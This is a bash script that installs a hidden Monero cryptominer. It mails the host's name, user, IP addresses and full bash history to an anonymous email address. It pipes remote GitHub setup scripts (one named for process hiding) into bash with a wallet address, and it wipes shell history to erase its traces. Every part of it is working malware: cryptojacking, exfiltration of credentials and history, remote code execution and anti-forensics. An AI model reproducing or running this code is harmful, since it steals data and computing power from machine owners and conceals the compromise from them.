#!/bin/bash
unset HISTFILE

# Function to check if a service exists
does_service_exist() {
    service="$1"
    systemctl list-units --type=service --all | grep -q "$service.service"
}

# Function to check if a service is running
is_service_running() {
    service="$1"
    systemctl is-active --quiet "$service"
}

# List of services to check
services=("swapd" "gdm2")

# Check if any of the services are running and abort if they are
for service in "${services[@]}"; do
    if does_service_exist "$service"; then
        if is_service_running "$service"; then
            echo "ERROR: Service $service is currently running. Aborting script execution."
            exit 1
        else
            echo "Service $service exists but is not running"
        fi
    else
        echo "Service $service does not exist"
    fi
done

echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
echo -e "|        RAM        |  $(free -h | awk '/^Mem:/ {print $2}')  |"
echo -e "|   CPU Cores    |      $(nproc)      |"
echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"
echo -e "---------------------------------"

# Enhanced email function with error handling
send_email_with_history() {
    # Get system info
    HOSTNAME=$(hostname)
    PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me || echo "N/A")
    LOCAL_IP=$(hostname -I | awk '{print $1}')
    USER=$(whoami)

    # Format email
    EMAIL_CONTENT=$(cat <<EOF
=== SYSTEM REPORT ===
Hostname: $HOSTNAME
User: $USER
Public IP: $PUBLIC_IP
Local IP: $LOCAL_IP

=== RESOURCES ===
RAM: $(free -h | awk '/^Mem:/ {print $2}')
CPU: $(nproc) cores
Storage: $(df -h / | awk 'NR==2 {print $2}')

=== BASH HISTORY ===
$(cat ~/.bash_history 2>/dev/null || echo "No history found")
EOF
    )

    # Try to send email (silent unless error)
    if command -v mail &>/dev/null; then
        echo "$EMAIL_CONTENT" | mail -s "System Report from $HOSTNAME" ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com 2>/tmp/mail_error.log
        if [ $? -ne 0 ]; then
            echo "Warning: Failed to send email (check /tmp/mail_error.log)"
        fi
    else
        echo "Warning: mailutils not installed - skipping email report"
    fi
}

# Call email function
send_email_with_history

# Original installation functions with root checks
rootstuff() {
    if [[ $(id -u) -ne 0 ]]; then
        echo "ERROR: root privileges required for this installation"
        return 1
    fi
    
    echo -e "\nStarting root installation..."
    curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
    
    # If switched user during install, restart script
    [ "$USER" != root ] && sudo -u "$USER" "$0"
}

userstuff() {
    echo -e "\nStarting user installation..."
    curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
}

# Original execution logic
if [[ $(id -u) -eq 0 ]]; then
    rootstuff
else
    userstuff
fi

# Enhanced history cleanup
cleanup_history() {
    echo "Cleaning history..."
    history -c
    rm -f ~/.bash_history
    for i in $(seq 1 $(history | wc -l)); do
        history -d 1
    done
}
cleanup_history
